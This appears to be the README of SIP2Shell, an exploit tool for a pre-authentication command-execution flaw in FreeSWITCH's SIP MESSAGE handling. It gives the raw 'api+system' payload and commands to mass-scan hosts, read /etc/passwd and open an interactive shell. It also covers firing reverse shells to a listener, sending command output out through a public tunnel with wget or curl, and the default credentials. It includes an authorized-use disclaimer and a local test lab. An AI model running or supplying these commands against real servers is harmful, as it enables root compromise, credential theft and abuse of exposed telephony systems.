# SIP2Shell

FreeSWITCH will run a command for you if you ask it in a text message.

CVE-2026-116779 is a small mistake with a big blast radius. When a SIP
`MESSAGE` comes in, FreeSWITCH takes the To address, splits it on the first
`+`, and treats the left half as the name of a chat protocol. Whatever follows
the `+` goes to that protocol's handler. One of the registered handlers is
called `api`, and it hands its input straight to `switch_api_execute()`.

So this is not a user:

```
MESSAGE sip:api+system%20id@target SIP/2.0
```

It is `system id`, run by the daemon. The reply comes back as another MESSAGE,
and because the chat layer is queued, a `202` only means "accepted" - you need
the output to know it actually ran.

SIP2Shell is the tool I wanted while digging into this. One Python file, no
dependencies, no `telnet(1)`, no proxy in the middle. It checks whether a host
is old enough to care, runs a command if it is, and gives you the output.
`scan` does it in bulk, `shell` gives you a prompt, `rev` fires reverse-shell
one-liners.

There is a real lab in `lab/`: `safarov/freeswitch:1.10.12` on one side and
`1.11.3` on the other. The old one hands you `uid=0`; the new one answers
`403`. No mock, no "trust me".

```
$ python3 sip2shell.py exploit -t 10.0.0.5 -c "id; hostname"
[*] target 10.0.0.5:5060
    OOB listener on http://203.0.113.10:8899/1fx5n6
uid=0(root) gid=0(root) groups=0(root)
edge-fsw-01
```

Run it on your own lab or a host you're allowed to test. That part is not
optional.

## Why it matters

- **Unauthenticated, pre-auth.** A single UDP packet runs commands.
- **In the wild and KEV.** CISA added it on 2026-11-09; the vendor confirmed
  exploitation.
- **Mass reachable.** ~13,600 FreeSWITCH instances are exposed to the internet
  and only a few hundred have upgraded (Bitsight footprint) - SIP on 5060 is
  everywhere, on telco and VPS alike.
- **Broad impact.** Command execution, and from there config/credential
  disclosure, arbitrary call control (`originate`), module load, or inline Lua
  via `mod_lua`.

## Affected

| | |
|---|---|
| Product | SignalWire FreeSWITCH (mod_sofia inbound MESSAGE) |
| Versions | **< 1.11.3** on the stock `internal`/`external` profiles |
| Fixed | 1.11.3 - a new `enable-chat-api-proto` gate, **off** by default |
| CVE / CVSS | CVE-2026-116779 / GHSA-mg63-h38w-8p9p - 9.8 |
| Status | CISA KEV, exploited in the wild |

The gate is *off* in 1.11.3+, so a patched box answers a `MESSAGE` to `api+`
with **403**. On a vulnerable box it answers **202** and runs the command.

## Install

```bash
git clone https://github.com/DeathShotXD/SIP2Shell.git
cd SIP2Shell
python3 sip2shell.py --help
```

Python 3.8+, standard library only. Nothing to install.

## Usage

### Mass scan (UDP by default; `--tcp` for TCP SIP)

```bash
# find vulnerable hosts; 202 = vulnerable, 403 = patched, 407 = auth-walled
python3 sip2shell.py scan -f hosts.txt --threads 64
python3 sip2shell.py scan -f hosts.txt --json -o out.json

# from a pipeline
nmap -sU -p 5060 --open -oG - 10.0.0.0/24 | awk '/5060\/open/{print $2}' | \
    python3 sip2shell.py scan
```

### Probe one host

```bash
python3 sip2shell.py probe -t 10.0.0.5
python3 sip2shell.py probe -t 10.0.0.5 --json
```

### Exploit (get a command back)

```bash
python3 sip2shell.py exploit -t 10.0.0.5 -c "cat /etc/passwd" --post
```

### Interactive shell

```bash
python3 sip2shell.py shell -t 10.0.0.5
```

### Reverse shells (blind fire)

```bash
nc -lvnp 4444
python3 sip2shell.py rev -t 10.0.0.5 --listen 203.0.113.9:4444
```

Fires `bash` / `nc` / `python3` payloads as separate MESSAGEs. A 2xx here only
means the MESSAGE was accepted; a shell is proven by your listener, not the
SIP status.

### Through a SOCKS5 proxy (TCP)

```bash
python3 sip2shell.py probe -t 10.0.0.5 --tcp \
    --proxy socks5://user:pass@127.0.0.1:1080
```

SOCKS5 relays TCP only; `--tcp` is implied and `--udp` with a proxy is
rejected.

### Behind NAT / on the internet

Read-back (the chat reply) needs the target to route to you. Over the internet,
hand the tool a public callback so it can exfil output out-of-band:

```bash
# free tunnel, no account:
ssh -R 80:localhost:8899 nokey@localhost.run   # prints https://xxxx.lhr.life
python3 sip2shell.py exploit -t 1.2.3.4 --oob-port 8899 \
    --oob-url http://xxxx.lhr.life -c "id"
```

`--oob-url` points the exfil at your public URL; `--oob-ip`/`--oob-port` for a
directly reachable host. `--lhost` advertises a public SIP source.

Profiles that require MESSAGE auth answer `407`; pass credentials with
`--user`/`--password` (digest auth is handled). Stock FreeSWITCH ships users
`1000`-`1019` with password `1234`.

## Local lab (real FreeSWITCH, A/B)

```bash
cd lab
./run.sh vuln      # safarov/freeswitch:1.10.12  -> vulnerable
./run.sh patched   # safarov/freeswitch:1.11.3  -> 403 patched
```

Point the tool at the printed `host:5060`. Or, without Docker:
`python3 lab/run.sh` needs Docker; there is no emulation.

`docker-compose.yml` runs the same bootstrap as a service
(`FS_IMAGE=safarov/freeswitch:1.11.3 docker compose up`).

## How it works

`sofia_presence_handle_sip_i_message()` splits the To user on the first `+`,
treats the left side as a chat protocol selector, and dispatches
(`sofia_presence.c`). `mod_dptools` registers an `api` chat interface whose
handler URL-decodes the remainder and calls `switch_api_execute()` - the same
dispatcher `fs_cli` uses. FreeSWITCH's `system` API runs its argument through
the shell, so `api+system <cmd>` is OS command execution. `api_chat_send()`
streams the result and messages it back with `switch_core_chat_send_args(...)`,
which is the read-back channel.

Details, the wire trace, the buffer constraints, and the local A/B are in
[docs/WRITEUP.md](docs/WRITEUP.md).

## Notes and limits

- The To user is copied into a ~512-byte buffer and the first `+` is special:
  spaces are `%20` and any command `+` is `%2B`. Keep the encoded command
  under ~500 bytes (the tool does).
- Output is exfiltrated with `wget`/`curl`/`busybox`; the tool falls back
  across all three so minimal appliances still call back.
- An auth-walled profile (`407`) needs valid credentials; the api proto is
  still reachable once authenticated.
- A custom chatplan that delivers `api` with `final_delivery=true` can stop the
  path on some deployments.

## Validation

Validated end-to-end against real FreeSWITCH builds in the included lab
(A/B: `1.10.12` -> root, `1.11.3` -> 403). See
[docs/WRITEUP.md](docs/WRITEUP.md#lab-validation).

## Authorized use

This is working exploit code. Run it **only** against systems you own or have
explicit written permission to test (your own lab, an engagement scope, or an
authorized bug-bounty target). Unauthorized access to third-party systems is
illegal. The author accepts no liability for misuse.

## Prior art

`hackzuoji/freeswitch-cve-2026-116779-POC` (`fscve`) is a solid, MIT,
stdlib-only toolkit for the same CVE. SIP2Shell differs in a few deliberate
ways:

- **Real A/B lab** (`safarov/freeswitch:1.10.12` vs `1.11.3`) instead of a
  mock-only suite.
- **Read-back + HTTP OOB** (wget/curl/busybox) with retries, so no external
  DNS zone is required; DNS exfil is fragile because a 63-byte label only
  carries ~30 bytes and hex doubles it.
- **Two-layer auth** (proxy `407` then server `401`) handled correctly.
- **Scan verdicts** distinguish a bare `202` from a confirmed FreeSWITCH
  fingerprint.

Credit to that project for documenting the wire constraints; the underlying
bug is SignalWire's (Orn Arnarson / Gunnlaugur).

## License

MIT - see [LICENSE](LICENSE). Authorized testing only.
